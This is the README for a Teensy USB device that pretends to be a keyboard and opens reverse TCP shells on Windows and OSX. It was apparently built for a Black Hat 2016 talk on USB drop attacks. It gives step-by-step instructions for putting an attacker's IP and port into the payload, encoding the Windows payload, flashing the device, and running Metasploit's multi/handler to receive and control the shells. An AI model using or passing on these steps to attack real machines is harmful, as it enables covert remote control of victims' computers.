#HID spoofing multi-OS payload for Teensy

This code allows to create a cross-platform HID spoofing payload that
will spawn a reverse TCP-shell on Windows and OSX.

It was developed as part of the presentation I made at Blackhat USA 2016:
[Does Dropping USB drives in parking lots and other places really work?](https://www.elie.net/publication/does-dropping-usb-drives-really-work) to show how to create realistic HID spoofing keys that can be used in USB key drop attack.

For more information on how to make realistic HID spoofing key see my [blog post on the subject](https://www.elie.net/malus)

# Environment setup

To get the payload working you need:
1. A Teensy. You can get one from [Amazon](http://amzn.to/2anjrMs) or [PRJC](https://www.pjrc.com/store/teensy32.html) directly
2. The Arduino environment with Teensyduino to compile your payload and the Teensy loader to upload the payload to your Teensy. See [instructions here](https://www.pjrc.com/teensy/index.html)

If you want to conceal the Teensy into a realistic key follow the instruction locate in the last third of my [blog post on the subject](https://www.elie.net/malus)

# Configuring the payload
The payload need to be configured to connect to the server of  your choice. There is to way to do it:
## Use the Python configuration script
That is the easy way and should work on most OSX and Linux or even Windows computers
as long as Python is installed. To run it simply invoke:
```
cd payload
python configure_payload.py IP PORT
```
where *IP* is the IP of the server and *PORT* is the TCP port you want the connection back. Your configured payload is available in the file **configured_payload.c**.

## Manual configuration
If you don't have python, something went wrong or want to do it manually. Here is
what you need to do:
  1. Edit the OSX payload from  **payload/payload_osx.sh** to
  replace the constant IP and PORT with the one from your server
  2. Replace in **payload/payload.c** the *OSX_PAYLOAD_STR* string with your customized payload
  3. Edit the Windows payload from  **payload/payload_win.ps** and replace the constant IP and PORT with the one from your server
  4. Compress and encode it with: `cat payload | gzip -c | base64`
  5. Replace the *WIN_PAYLOAD_STR* string in the **payload/payload.c** with the output of the previous command. The *WIN_PAYLOAD_STR* string is in the middle of the Windows payload.

# Compiling and uploading payload to the Teensy
Once the payload is configured, to get your Teensy up and running all you need to do is:
1. Create a new project in Arduino environment
2. In Tool make sure that the *Board* option is set to *"Teensy 3.2 / 3.1"*
3. The Tool again set the *USB Type* option is set to : *"Serial + Keyboard + Mouse + Joystick"*
4. copy/past the code in the Arduino environment
5. Check that it is working by pressing the verify button
6. Press the compile and upload button to program your Teensy

Congratulation your Teensy is ready to go.


# Configuring the server

The server aspect requires to have a server that have a static IP that is reachable form Internet. We are going to use the generic Metasploit multi handler to control the reverse shell(s). Here is briefly how to do it, for more information please read the [Metaploit documentation](https://help.rapid7.com/metasploit/index.html)

1. Install and launch Metasploit
2. Load the multi-handler `use exploit/multi/handler`
3. Set the Payload to reverse-shell `set payload osx/x64/shell_reverse_tcp` Despite the name, it will works for all OS
4. Set the IP of the server `set LHOST YOUR_IP`
5. Set the PORT of the server `set LPORT YOUR_PORT`
6. Tell Metasploit to not close the plugin when a session disconnect: `set ExitOnSession false`
7. Launch the paylaod: `exploit -j -z`

# Controlling a reverse shell

When a key is plugged you will see a log message indicating a new session is connected. You get the list of sessions by issuing the command:
```
sessions -l
```

To control a specific session:
```
sessions -i session_id
```
